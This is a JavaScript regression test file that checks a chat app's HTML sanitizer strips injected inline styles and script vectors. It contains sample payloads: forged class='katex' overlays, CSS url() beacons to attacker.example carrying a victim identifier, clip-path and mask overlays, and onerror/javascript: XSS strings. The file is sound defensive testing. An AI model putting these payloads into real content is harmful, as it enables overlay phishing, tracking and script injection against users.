/* @vitest-environment jsdom */
/**
 * Regression tests for stored CSS injection via the message `style` attribute.
 *
 * `style` is allowed so KaTeX's generated inline layout styles survive sanitization,
 * but raw author HTML flows through the same DOMPurify allowlist. The sanitizer hook
 * (`ensureKatexOnlyStyleSanitizerHook`) must:
 *   1. strip `style` from any element NOT inside a `.katex` subtree, and
 *   2. strip overlay/beacon declarations even when an element IS (or forges) a
 *      `.katex` ancestor — `class` is itself an attacker-settable allowed attribute,
 *      so the ancestor gate alone is bypassable.
 *
 * Without (2), `<div class="katex"><span class="katex" style="position:fixed;…">`
 * smuggles a full-viewport overlay past sanitization (confirmed bypass).
 */
import { describe, expect, it } from 'vitest';
import {
  ensureKatexReady,
  parseMessageContent,
} from '@/composables/useMarkdown';

describe('message style-attribute hardening', () => {
  it('strips style from plain user HTML (outside .katex)', () => {
    const out = parseMessageContent(
      '<a href="https://example.com" style="position:fixed;inset:0;z-index:2147483647">x</a>',
    );
    expect(out.toLowerCase()).not.toMatch(/\bstyle\s*=/);
    expect(out).toContain('href="https://example.com"');
  });

  it('blocks the forged class="katex" overlay bypass', () => {
    const out = parseMessageContent(
      '<div class="katex"><span class="katex" style="position:fixed;inset:0;z-index:99999;background:red">overlay</span></div>',
    );
    expect(out.toLowerCase()).not.toMatch(/position\s*:\s*fixed/);
    expect(out.toLowerCase()).not.toMatch(/z-index/);
  });

  it('blocks the forged class="katex" url() beacon bypass', () => {
    const out = parseMessageContent(
      '<span class="katex" style="background:url(http://attacker.example/beacon?u=victim)">x</span>',
    );
    expect(out.toLowerCase()).not.toMatch(/url\(/);
    expect(out).not.toMatch(/attacker\.example/);
  });

  it('blocks position:sticky too (overlay variant)', () => {
    const out = parseMessageContent(
      '<span class="katex" style="position:sticky;top:0;z-index:5">x</span>',
    );
    expect(out.toLowerCase()).not.toMatch(/position\s*:\s*sticky/);
    expect(out.toLowerCase()).not.toMatch(/z-index/);
  });

  it('still renders real KaTeX with its inline layout styles intact', async () => {
    // KaTeX is lazy-loaded; warm the chunk so we assert on typeset output
    // rather than the interim placeholder.
    await ensureKatexReady();
    const out = parseMessageContent('$\\frac{1}{2}$');
    // KaTeX emits inline style (height/vertical-align/etc.) on layout spans.
    expect(out).toMatch(/style=/i);
    // and must not have been forced to carry overlay/beacon CSS.
    expect(out.toLowerCase()).not.toMatch(/position\s*:\s*fixed/);
    expect(out.toLowerCase()).not.toMatch(/url\(/);
  });

  it('blocks forged katex clip-path / mask overlays', () => {
    const out = parseMessageContent(
      '<span class="katex" style="clip-path:circle(50%);mask-image:url(http://attacker.example/m)">x</span>',
    );
    expect(out.toLowerCase()).not.toMatch(/clip-path/);
    expect(out.toLowerCase()).not.toMatch(/mask-image/);
    expect(out).not.toMatch(/attacker\.example/);
  });

  it('strips SVG outside KaTeX / alert icon subtrees', () => {
    const out = parseMessageContent(
      '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg> hi',
    );
    expect(out.toLowerCase()).not.toMatch(/<svg/);
    expect(out.toLowerCase()).not.toMatch(/<path/);
  });

  it('keeps markdown alert icons (trusted SVG)', () => {
    const out = parseMessageContent('> [!NOTE]\n> note body');
    expect(out).toContain('md-alert__icon');
    expect(out.toLowerCase()).toMatch(/<svg/);
  });

  it('never permits script-execution vectors (unchanged guarantee)', () => {
    const out = parseMessageContent(
      '<img src=x onerror="alert(1)"><a href="javascript:alert(1)">x</a>',
    );
    expect(out.toLowerCase()).not.toMatch(/onerror/);
    expect(out.toLowerCase()).not.toMatch(/javascript:/);
  });
});
